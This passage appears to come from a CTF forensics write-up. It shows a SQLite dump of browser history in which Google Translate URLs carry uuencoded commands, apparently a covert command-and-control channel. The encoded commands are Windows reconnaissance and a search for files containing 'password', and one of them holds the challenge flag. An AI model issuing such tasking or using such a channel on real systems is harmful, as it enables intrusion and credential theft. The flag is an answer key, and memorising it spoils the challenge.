VFVCx5gpMAu3fqpqE8rsSEgKB_b6E1lrSJfJriOB6Jfi9m5SkLRCiWQ9i7qv3Ik1cWcFJ3xS2pPO1OqYMKa6L4mmO8hLXVtMgPj86xAoLQf1Wf9Ix-sntxrFLX2Jh1tHkhHecEcVFKijlC8PDQUZS-EbC13SwtlWEl--diaosglmmlucfJoGdrrQQfvPQ4kH6lShWGkZtrZiknN8TtayDyni8blYNUezKvNkIvmkFHG4qIr1Ihyi_I9EQK0ZTYfGGfkQU5i9awctjb-Tk4k7D_P-f2y1ILwkUoD6F3cx-CN8AqnVFqDHn2MmqWod4-WJkkPhuH0JSNsvhSoDv9oB9mzOr2bQpqt-zzdZ3k3rnAjBcWFBUxndaTAbI9loUOlULC5j98CFxy5yUwf5XNthKntGRG2TcvVu4Wimln3vA1Rgu_ADO1OkF_dh5za0__E7KHMRGvecz9SQR7V__q4huhF3mAZORiSV1C_ccbd3Ee8Z3m8-8AOw-PFC1QqD9RjaDwnrTCguWWxXnB0NE0oxBbuWj4OsEKvk31vpXe1BDNe405JuW-siIY8GmlL3dNYnCBvvvkwsq2aTsyxbFUpVBV4seeiNJr5plfipF0PrmL9a_4V2U9JMHiSGgskBu3NVcKWH6dPtsyD_5I2lbadmZOs_VFVhIytYGPdEXFrFYvBw&sei=qsTaaIKZHL_l5NoPm9PXwAc
https://www.google.com/search?q=google+translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google+translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz&sei=hsTaaIa1B8Gk5NoP6bix0QE
https://www.google.com/search?q=google+translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google+translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz&sei=hsTaaIa1B8Gk5NoP6bix0QE&google_abuse=GOOGLE_ABUSE_EXEMPTION%3DID%3D6f836c6faf2940ef:TM%3D1759167622:C%3DR:IP%3D3.225.222.31-:S%3DIxFMj-OHSm7BM9jl6VZetr4%3B+path%3D/%3B+domain%3Dgoogle.com%3B+expires%3DMon,+29-Sep-2025+20:40:22+GMT
https://www.google.com/search?q=google+translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google+translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz&sei=qsTaaIKZHL_l5NoPm9PXwAc
https://www.google.com/search?q=google+translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google+translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz&sg_ss=*sY2ajdXyAAb17ckR1e19xoshSE2V4ZgEADQBEArZ1NTCS_dSoMuWriJofvC-lTeJ0P1ZY88dwq7_cWN7bc6ZRk-XHAM5sEGg35Vw8ITiPQAAAHZtAAAAFFcBB0EANaiwmtpOq869PYTswVQqHza2mKbK9CLmheRGXJoYw74VAJsuOeHDOaZdJ8_2broGfLTCpjFGNQBfe8KGMKMY-E471WKloYsXxh0bSneZCWcHzve4cg8rFa1tenJz3Srkl2egVkLsK_gMja5NQClOQ-TuVjosdZNPijoCGptQZxAkrnClGVhMlL48WDybq2eohDRZfolrRiSmAkuhc5iGNPIV3lv4eoXYKSTuRJrNrhZc4MmqHekNVZDZeJlifLOmF1EK7ZQz4dJ1c2qc6vsv-97-c9NZZRRCSP1JOiuK1eP0nhLBnyVFVCx5gpMAu3fqpqE8rsSEgKB_b6E1lrSJfJriOB6Jfi9m5SkLRCiWQ9i7qv3Ik1cWcFJ3xS2pPO1OqYMKa6L4mmO8hLXVtMgPj86xAoLQf1Wf9Ix-sntxrFLX2Jh1tHkhHecEcVFKijlC8PDQUZS-EbC13SwtlWEl--diaosglmmlucfJoGdrrQQfvPQ4kH6lShWGkZtrZiknN8TtayDyni8blYNUezKvNkIvmkFHG4qIr1Ihyi_I9EQK0ZTYfGGfkQU5i9awctjb-Tk4k7D_P-f2y1ILwkUoD6F3cx-CN8AqnVFqDHn2MmqWod4-WJkkPhuH0JSNsvhSoDv9oB9mzOr2bQpqt-zzdZ3k3rnAjBcWFBUxndaTAbI9loUOlULC5j98CFxy5yUwf5XNthKntGRG2TcvVu4Wimln3vA1Rgu_ADO1OkF_dh5za0__E7KHMRGvecz9SQR7V__q4huhF3mAZORiSV1C_ccbd3Ee8Z3m8-8AOw-PFC1QqD9RjaDwnrTCguWWxXnB0NE0oxBbuWj4OsEKvk31vpXe1BDNe405JuW-siIY8GmlL3dNYnCBvvvkwsq2aTsyxbFUpVBV4seeiNJr5plfipF0PrmL9a_4V2U9JMHiSGgskBu3NVcKWH6dPtsyD_5I2lbadmZOs_VFVhIytYGPdEXFrFYvBw&sei=qsTaaIKZHL_l5NoPm9PXwAc
https://www.google.com/search?q=google+translate+github&sca_esv=219388647f983b16&ei=sMTaaMGfAu2u5NoPzfeD6Q8&ved=0ahUKEwjBt9ydwv6PAxVtF1kFHc37IP0Q4dUDCBA&uact=5&oq=google+translate+github&gs_lp=Egxnd3Mtd2l6LXNlcnAiF2dvb2dsZSB0cmFuc2xhdGUgZ2l0aHViMgUQABiABDIGEAAYFhgeMgYQABgWGB4yBhAAGBYYHjIGEAAYFhgeMgYQABgWGB4yCBAAGBYYHhgKMgYQABgWGB4yBhAAGBYYHjIGEAAYFhgeSIoLUIsDWKYJcAB4ApABAJgBPqAB2AKqAQE3uAEDyAEA-AEBmAIIoAKdA8ICBBAAGEfCAgsQABiABBixAxiDAcICCBAAGIAEGLEDwgIOEAAYgAQYigUYsQMYgwHCAgsQABiABBiKBRiRAsICBxAAGIAEGAqYAwCIBgGQBgiSBwE4oAfwKrIHATe4B40DwgcFMi03LjHIBzQ&sclient=gws-wiz-serp
https://www.google.com/sorry/index?continue=https://www.google.com/search%3Fq%3Dgoogle%2Btranslate%26sca_esv%3D219388647f983b16%26source%3Dhp%26ei%3DgsTaaNbZFO6bptQP7NvioQg%26iflsig%3DAOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ%26ved%3D0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA%26uact%3D5%26oq%3Dgoogle%2Btranslate%26gs_lp%3DEgdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ%26sclient%3Dgws-wiz%26sei%3DhsTaaIa1B8Gk5NoP6bix0QE&q=EgQD4d4fGIaJ68YGIjD2JH_nUHdDpzcTQflV_ZUkEM2f1nJQzzDJ3_aGfAmuhMPl36NKksqyoXxA2zKhRKwyAVJaAUM
sqlite>
```
This is `urlencode`, let use Cyberchef to decode it faster. And here we can see `STARTCOMMAND ...snip... ENDCOMMAND`, the golang code we saw before. then you will see `uuencode`, I knew it when i saw `begin ... end` 💀.

```
### history.txt
SQLite version 3.43.2 2023-10-10 13:08:14
Enter ".help" for usage hints.
sqlite> select url from urls;
http://ctf.huntress.com/
http://google.com/
https://ctf.huntress.com/
https://ctf.huntress.com/faq
https://ctf.huntress.com/prizes
https://ctf.huntress.com/rules
https://discord.com/invite/zMGs6khZpa
https://discord.gg/zMGs6khZpa
https://freenom.com/
https://github.com/UnkL4b/BabyShark
https://github.com/UnkL4b/BabyShark/blob/master/app.py
https://github.com/UnkL4b/BabyShark?tab=readme-ov-file
https://github.com/mthbernardes/GTRS
https://github.com/mthbernardes/GTRS/blob/master/utils/inmemory-linux.py
https://github.com/mthbernardes/GTRS/releases
https://github.com/mthbernardes/GTRS/releases/tag/v1
https://github.com/mthbernardes/GTRS?tab=readme-ov-file
https://google.com/
https://lolc2.github.io/
https://mthbernardes.github.io/rce/2018/12/14/hosting-malicious-payloads-on-youtube.html
https://translate.google.com/
https://translate.google.com/?hl=en&tab=TT
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Τα μεγάλα ταξίδια αρχίζουν με ένα μικρό βήμα — μη φοβάσαι το πρώτο.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Лучше один раз увидеть, чем сто раз услышать — путешествия учат лучше всего.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=אין דבר העומד בפני הרצון — רק התמדה ותקווה מנצחים בסוף.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=ليس كل ما يلمع ذهبًا؛ القيم الحقيقية تظهر في الأفعال اليومية.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=जहाँ चाह वहाँ राह — कठिनाइयाँ आती हैं, पर हिम्मत रखें तो जीत आपकी है।&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=不经历风雨，怎么见彩虹？努力总会有回报。&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=石の上にも三年 — 継続は力なり、今日も一歩前へ。&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=배움에는 끝이 없다 — 작은 호기심이 큰 변화를 만든다.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=A vida é como um rio: às vezes calma, às vezes turbulenta, sempre em frente.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Aunque la montaña sea alta, paso a paso se llega a la cima.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Borta bra men hemma bäst — ibland behöver man vila på sin egen plats.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Der frühe Vogel fängt den Wurm, doch Geduld bringt Rosen.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Güneş her sabah doğar; dünü bırak, bugünü kucakla ve ileri bak.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Mưa dầm thấm lâu — việc nhỏ nhưng đều đặn sẽ mang kết quả lớn.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Nie oceniaj książki po okładce — każdy ma swoją historię i ciche bitwy.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Non tutte le ciambelle escono col buco; impariamo dagli errori e andiamo avanti.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Rumahku adalah istanaku, tetapi dunia menunggu di luar; jaga keseimbangan&op=translatehttps://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=ความพยายามอยู่ที่ไหน ความสำเร็จอยู่ที่นั่น — อย่ายอมแพ้ก่อนจะลองเต็มที่.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
+<WES=&5M:6YF;PH`
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
,;F5T<W1A="`M86(*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
,;F5T('-E<W-I;VX*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
,9W!R97-U;'0@+W(*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
:9G-U=&EL('9O;'5M92!D:7-K9G)E92!#.@H`
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
<<V-H=&%S:W,@+W%U97)Y("]F;R!,25-4("]V"@``
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
<9&ER("]A("]S(")#.E!R;V=R86T@1FEL97,B"@``
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
>;F5T(&QO8V%L9W)O=7`@861M:6YI<W1R871O<G,*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
>;G-L;V]K=7`@+71Y<&4]86YY(&=O;V=L92YC;VT*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
);F5T('5S97(*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
)<V,@<75E<GD*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
*;F5T('-H87)E"@``
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
-;F5T<W1A="`M86YO"@``
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
.:7!C;VYF:6<@+V%L;`H`
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
.=&%S:VQI<W0@+W-V8PH`
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
3<V,@<6,@;&%N;6%N<V5R=F5R"@``
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
A=V5V='5T:6P@<64@4WES=&5M("]C.C$P("]F.G1E>'0*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
C=VUI8R!B:6]S(&=E="!S97)I86QN=6UB97(L=F5R<VEO;@H`
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
E9&ER($,Z("]S("]B('P@9FEN9'-T<B`O:2`B<&%S<W=O<F0B"@``
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
F;F5T(&QO8V%L9W)O=7`@(E)E;6]T92!$97-K=&]P(%5S97)S(@H`
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
H:6-A8VQS($,Z5VEN9&]W<U-Y<W1E;3,R9')I=F5R<V5T8VAO<W1S"@``
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
L=VUI8R!P<F]C97-S(&=E="!0<F]C97-S260L3F%M92Q#;VUM86YD3&EN90H`
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
M<F5G('%U97)Y(")(2TQ-4T]&5%=!4D5-:6-R;W-O9G17:6YD;W=S0W5R<F5N
0=%9E<G-I;VY2=6XB("]S"@``
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
M<V5C961I="`O97AP;W)T("]C9F<@0SI7:6YD;W=S5&5M<'-E8W!O;"YC9F<*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
M=VUI8R!L;V=I8V%L9&ES:R!G970@;F%M92QS:7IE+&9R965S<&%C92QP<F]V
):61E<FYA;64*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
M871T<FEB("US("UH($,Z5VEN9&]W<U-Y<W1E;3,R9')I=F5R<V5T8VAO<W1S
!"@``
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
M96-H;R`E55-%4DY!344E("8F(&5C:&\@)55315)$3TU!24XE("8F(&5C:&\@
/)4-/35!55$523D%-124*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=Wie het kleine niet eert, is het grote niet weerd — begin met kleine gewoonten.&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=en&tl=es&text=STARTCOMMAND
begin 664 -
39V5T;6%C("]V("]F;R!L:7-T"@``
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=es&tl=en&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=es&tl=en&text=STARTCOMMAND
begin 664 -
'87)P("UA"@``
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=es&tl=en&text=STARTCOMMAND
begin 664 -
,<F]U=&4@<')I;G0*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=es&tl=en&text=STARTCOMMAND
begin 664 -
2<&EN9R`M;B`T(#@N."XX+C@*
`
end
ENDCOMMAND
&op=translatehttps://translate.google.com/?hl=en&tab=TT&sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
3=')
https://translate.google.com/?hl=en&tab=TT&sl=es&tl=en&text=STARTCOMMAND
begin 664 -
L96-H;R!F;&%G>S8Y,C`P8S$S9&-B,SED93$Y830P-64Y9#%F.3DS.#(Q?0H`
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&sl=pt&tl=en&text=STARTCOMMAND
begin 664 -
5:7!C;VYF:6<@+V1I<W!L87ED;G,*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?hl=en&tab=TT&tab=TT&sl=auto&tl=en&text=Rumahku adalah istanaku, tetapi dunia menunggu di luar; jaga keseimbangan&op=translate
https://translate.google.com/?hl=en&tab=TT&tab=TT&sl=es&tl=en&text=STARTCOMMAND
begin 664 -
2<&EN9R`M;B`T(#@N."XX+C@*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?sl=auto&tl=en&op=translate
https://translate.google.com/?sl=auto&tl=en&text=Quand on veut, on peut — il suffit de persévérer et de garder le cap.&op=translate
https://translate.google.com/?sl=auto&tl=en&text=STARTCOMMAND
begin 664 -
,=&%S:VQI<W0@+W8*
`
end
ENDCOMMAND
&op=translate
https://translate.google.com/?sl=pt&tl=en&text=STARTCOMMAND
begin 664 -
,=VAO86UI("]A;&P*
`
end
ENDCOMMAND
&op=translate
https://www.freenom.com/en/index.html?lang=en
https://www.google.com/
https://www.google.com/?zx=1759167619067&no_sw_cr=1
https://www.google.com/search?q=google translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz
https://www.google.com/search?q=google translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz&google_abuse=GOOGLE_ABUSE_EXEMPTION=ID=6f836c6faf2940ef:TM=1759167622:C=R:IP=3.225.222.31-:S=IxFMj-OHSm7BM9jl6VZetr4; path=/; domain=google.com; expires=Mon, 29-Sep-2025 20:40:22 GMT&sg_ss=*sY2ajdXyAAb17ckR1e19xoshSE2V4ZgEADQBEArZ1NTCS_dSoMuWriJofvC-lTeJ0P1ZY88dwq7_cWN7bc6ZRk-XHAM5sEGg35Vw8ITiPQAAAHZtAAAAFFcBB0EANaiwmtpOq869PYTswVQqHza2mKbK9CLmheRGXJoYw74VAJsuOeHDOaZdJ8_2broGfLTCpjFGNQBfe8KGMKMY-E471WKloYsXxh0bSneZCWcHzve4cg8rFa1tenJz3Srkl2egVkLsK_gMja5NQClOQ-TuVjosdZNPijoCGptQZxAkrnClGVhMlL48WDybq2eohDRZfolrRiSmAkuhc5iGNPIV3lv4eoXYKSTuRJrNrhZc4MmqHekNVZDZeJlifLOmF1EK7ZQz4dJ1c2qc6vsv-97-c9NZZRRCSP1JOiuK1eP0nhLBnyVFVCx5gpMAu3fqpqE8rsSEgKB_b6E1lrSJfJriOB6Jfi9m5SkLRCiWQ9i7qv3Ik1cWcFJ3xS2pPO1OqYMKa6L4mmO8hLXVtMgPj86xAoLQf1Wf9Ix-sntxrFLX2Jh1tHkhHecEcVFKijlC8PDQUZS-EbC13SwtlWEl--diaosglmmlucfJoGdrrQQfvPQ4kH6lShWGkZtrZiknN8TtayDyni8blYNUezKvNkIvmkFHG4qIr1Ihyi_I9EQK0ZTYfGGfkQU5i9awctjb-Tk4k7D_P-f2y1ILwkUoD6F3cx-CN8AqnVFqDHn2MmqWod4-WJkkPhuH0JSNsvhSoDv9oB9mzOr2bQpqt-zzdZ3k3rnAjBcWFBUxndaTAbI9loUOlULC5j98CFxy5yUwf5XNthKntGRG2TcvVu4Wimln3vA1Rgu_ADO1OkF_dh5za0__E7KHMRGvecz9SQR7V__q4huhF3mAZORiSV1C_ccbd3Ee8Z3m8-8AOw-PFC1QqD9RjaDwnrTCguWWxXnB0NE0oxBbuWj4OsEKvk31vpXe1BDNe405JuW-siIY8GmlL3dNYnCBvvvkwsq2aTsyxbFUpVBV4seeiNJr5plfipF0PrmL9a_4V2U9JMHiSGgskBu3NVcKWH6dPtsyD_5I2lbadmZOs_VFVhIytYGPdEXFrFYvBw&sei=qsTaaIKZHL_l5NoPm9PXwAc
https://www.google.com/search?q=google translate&sca_esv=219388647f983b16&source=hp&ei=gsTaaNbZFO6bptQP7NvioQg&iflsig=AOw8s4IAAAAAaNrSkrGRCckpljVk4OfaCbT48YkeOUvZ&ved=0ahUKEwjWoveHwv6PAxXujYkEHeytOIQQ4dUDCBA&uact=5&oq=google translate&gs_lp=Egdnd3Mtd2l6IhBnb29nbGUgdHJhbnNsYXRlMgsQABiABBixAxiDATIFEAAYgAQyCxAAGIAEGLEDGIMBMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyCBAAGIAEGLEDMgsQABiABBixAxiDATILEAAYgAQYsQMYgwEyBRAAGIAEMggQABiABBixA0i4FlAAWPEUcAF4AJABAJgBjwGgAcEFqgEEMTYuMbgBA8gBAPgBAZgCEqACrAbCAhEQLhiABBixAxiDARjHARjRA8ICCxAuGIAEGLEDGIMBwgIOEAAYgAQYigUYsQMYgwHCAg4QLhiDARixAxiABBiKBcICBBAAGAPCAg4QLhiABBixAxjHARjRA8ICCBAuGIAEGLEDwgIOEC4YgwEY1AIYsQMYgASYAwCSBwQxNy4xoAe4cLIHBDE2LjG4B6UGwgcHMC44LjguMsgHUQ&sclient=gws-wiz&sei=hsTaaIa1B8Gk5NoP6bix0QE
